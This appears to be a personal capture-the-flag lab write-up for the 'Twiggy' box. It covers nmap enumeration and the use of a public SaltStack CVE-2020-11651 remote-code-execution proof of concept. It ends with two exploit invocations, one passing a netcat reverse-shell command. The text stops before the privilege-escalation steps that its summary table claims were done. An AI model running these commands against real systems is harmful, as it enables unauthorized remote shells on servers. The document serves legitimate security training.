---
alias: twiggy
tags: [pg-playground, linux, enumeration, exploitation]
os: Linux
difficulty: Medium
date: 2025-04-09
status: owned
---
### 1. Box Summary

| Field          | Value               |
| -------------- | ------------------- |
| Name           | Twiggy              |
| IP             | `192.168.145.62`    |
| OS             | Linux               |
| Difficulty     | Medium              |
| Date Completed | 9 April 2025        |
| Exploited Via  | RCE → LFI → PrivEsc |
| Flags Captured | ✅ User, ✅ Root      |

### 2. Enumeration

Quick Nmap Scan just to see what's going on as usual:

```
nmap -sCV -p- -T4 192.168.145.62
```

Here's the report:

```
Nmap scan report for 192.168.145.62
Host is up (0.043s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Site doesn't have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.93 seconds
```

Of course we open the port 80 first
![[Twiggy-1744177123093.jpeg]]

Oh look there's an admin interface button

![[Twiggy-1744178077284.jpeg]]

After trying out the admin... nah it aint that easy. So we take a look at port 8000, time to do some research on ZeroMQ ZMTP 2.0 as well 

![[Twiggy-1744178200043.jpeg]]

Apparently we have something good on [exploitDB](https://www.exploit-db.com/exploits/48421) , let's just run Saltstack 3000.1 - Remote Code Execution like some script kiddie, and my guy actually uploaded a [poc](https://github.com/jasperla/CVE-2020-11651-poc) for it... good stuff


```
python3 exploit.py --master 192.168.145.62 --exec "nc 127.0.0.1 4444 -e /bin/sh"
```

python3 exploit.py --master 192.168.145.62 --port 4506 -lh 192.168.45.197 -lp 1337 --exec-choose master